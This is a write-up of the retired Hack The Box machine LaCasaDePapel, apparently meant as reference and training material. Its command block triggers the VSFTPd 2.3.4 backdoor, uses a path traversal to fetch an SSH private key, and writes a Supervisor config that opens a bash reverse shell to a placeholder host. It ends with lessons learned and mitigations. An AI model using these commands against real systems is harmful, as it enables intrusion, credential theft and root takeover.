---
machine: LaCasaDePapel
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, vsftpd, backdoor, ftps, supervisor]
---

# LaCasaDePapel — Hack The Box (Linux)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

VSFTPd 2.3.4 contains the backdoor that opens a shell on port `6200`. Client-certificate access to the private site and a traversal lead to SSH. A Supervisor process runs a configuration in a controllable directory; even if the file cannot be edited, it can be deleted and recreated.

## Reconnaissance

```bash
nmap -Pn -sCV -p21,22,80,443,6200 <IP>
ftp <IP>
# USER user:)
# PASS x
nc <IP> 6200
openssl s_client -connect <IP>:443 -cert client.crt -key client.key
curl -k --cert client.crt --key client.key "https://<IP>/private/../../../../home/<USER>/.ssh/id_rsa"
# Supervisor
ls -la /home/<USER>/config/
rm /home/<USER>/config/supervisord.conf
printf '[program:x]\ncommand=/bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"\n' > /home/<USER>/config/supervisord.conf
```

## Enumeration

- VSFTPd 2.3.4 and FTPS with a client certificate.
- Private site with downloads and a path traversal.
- Supervisor with a configuration file in a user directory.

## Initial access

The VSFTPd backdoor triggers by sending `USER` with `:)` and opens a Psy console on `6200`. Obtain a PHP shell; the client certificate grants access to the private site and a traversal downloads the SSH key.

## Privilege escalation

Root Supervisor reads a configuration file inside a user-controlled directory. Although the file is owned by root, it can be deleted and recreated with a command that runs as root.

## Evidence

- Port `6200` open after the FTP attempt.
- Psy console and recovered SSH key.
- Recreated Supervisor configuration and root shell.

## Lessons learned

- Known backdoors remain in unpatched services.
- Client certificates do not replace per-path authorization.
- Directory permissions can matter more than file permissions.

## Mitigation and detection

- Update VSFTPd and remove backdoored versions.
- Validate paths and do not trust only the certificate.
- Mount Supervisor configuration read-only in non-writable directories.

## References

- [0xdf — LaCasaDePapel](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
- [Supervisor — Configuration](http://supervisord.org/configuration.html)
- [Hack The Box — LaCasaDePapel](https://app.hackthebox.com/machines/lacasadepapel)
